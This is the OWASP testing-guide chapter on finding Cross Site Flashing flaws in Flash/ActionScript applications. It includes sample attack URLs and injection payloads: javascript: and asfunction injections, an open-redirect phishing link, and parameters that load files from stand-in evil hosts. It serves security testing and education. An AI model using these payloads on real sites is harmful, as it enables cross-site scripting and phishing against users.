# Testing for Cross Site Flashing

|ID          |
|------------|
|WSTG-CLNT-08|

## Summary

ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.

ActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.

Cross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.

XSF occurs when the following scenarios are initiated from different domains:

- One movie loads another movie with `loadMovie*` functions (or other hacks) and has access to the same sandbox, or part of it.
- An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:
    - `GetVariable` to access Flash public and static objects from JavaScript as a string.
    - `SetVariable` to set a static or public Flash object to a new string value with JavaScript.
- Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.

XSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when `loadMovie*` methods are used.

### Open Redirectors

SWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.

In the Flash case, the malicious URL might look like:

```text
http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
```

In the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the `getURLValue` and provides it to an ActionScript browser navigation call:

```actionscript
getURL(_root.getURLValue,"_self");
```

This would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.

Developers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.

### Attacks and Flash Player Version

Since May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.

| Player Version | `asfunction` | ExternalInterface | GetURL | HTML Injection |
|----------------|--------------|-------------------|--------|----------------|
| v9.0 r47/48    |  Yes         |   Yes             | Yes    |     Yes        |
| v9.0 r115      |  No          |   Yes             | Yes    |     Yes        |
| v9.0 r124      |  No          |   Yes             | Yes    |     Partially  |

## Test Objectives

- Decompile and analyze the application's code.
- Assess sinks inputs and unsafe method usages.

## How to Test

Since the first publication of [Testing Flash Applications](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf), new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.

### Decompilation

Since SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.

To decompile a SWF file with flare just type:

`$ flare hello.swf`

This results in a new file called hello.flr.

Decompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassmeblers and flash security tools.

### Undefined Variables FlashVars

FlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

FlashVars can also be initialized from the URL:

`http://www.example.org/somefilename.swf?var1=val1&var2=val2`

In ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

In ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by `_root`, `_global` or `_level0`. This means that if an attribute like `_root.varname` is undefined throughout the code flow, it could be overwritten by URL parameters:

`http://victim/file.swf?varname=value`

Regardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let's look at some ActionScript 2.0 code that is vulnerable:

Example:

```actionscript
movieClip 328 __Packages.Locale {

#initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
            ++v2;
            }
            on_load();
        } else {}
        };
        if (_root.language != undefined) {
        Locale.DEFAULT_LANG = _root.language;
        }
        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');
    };
```

The above code could be attacked by requesting:

`http://victim/file.swf?language=http://evil.example.org/malicious.xml?`

### Unsafe Methods

When an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.

Unsafe Methods since version r47 are:

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### Exploitation by Reflected XSS

The swf file should be hosted on the victim's host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:

```html
<iframe src='http://victim/path/to/file.swf'></iframe>
```

In this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.

### GetURL (AS2) / NavigateToURL (AS3)

The GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser's window. If an undefined variable is used as the first argument for getURL:

`getURL(_root.URI,'_targetFrame');`

Or if a FlashVar is used as the parameter that is passed to a navigateToURL function:

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

Then this will mean it's possible to call JavaScript in the same domain where the movie is hosted by requesting:

`http://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

The same is possible when only some part of `getURL` is controlled via DOM injection with Flash JavaScript injection:

```js
getUrl('javascript:function('+_root.arg+')')
```

### Using `asfunction`

You can use the special `asfunction` protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 `asfunction` could be used on every method which has a URL as an argument. After that release, `asfunction` was restricted to use within an HTML TextField.

This means that a tester could try to inject:

```actionscript
asfunction:getURL,javascript:evilcode
```

in every unsafe method, such as:

```actionscript
loadMovie(_root.URL)
```

by requesting:

`http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### ExternalInterface

`ExternalInterface.call` is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.

From a security point of view it could be abused when part of its argument could be controlled:

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

the attack pattern for this kind of flaw may be something like the following:

```js
eval(evilcode)
```

since the internal JavaScript that is executed by the browser will be something similar to:

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### HTML Injection

TextField Objects can render minimal HTML by setting:

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

So if some part of text could be controlled by the tester, an `<a>` tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.

Some attack examples with `<a>` tag:

- Direct XSS: `<a href='javascript:alert(123)'>`
- Call a function: `<a href='asfunction:function,arg'>`
- Call SWF public functions: `<a href='asfunction:_root.obj.function, arg'>`
- Call native static as function: `<a href='asfunction:System.Security.allowDomain,evilhost'>`

An image tag could be used as well:

```html
<img src='http://evil/evil.swf'>
```

In this example, `.swf` is necessary to bypass the Flash Player internal filter:

```html
<img src='javascript:evilcode//.swf'>
```

Since the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.

The following tools may be helpful in working with SWF:

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [Decompiler – Flare](http://www.nowrap.de/flare.html)
- [Disassembler – Flasm](http://flasm.sourceforge.net/)
- [Swfmill – Convert Swf to XML and vice versa](https://www.swfmill.org/)
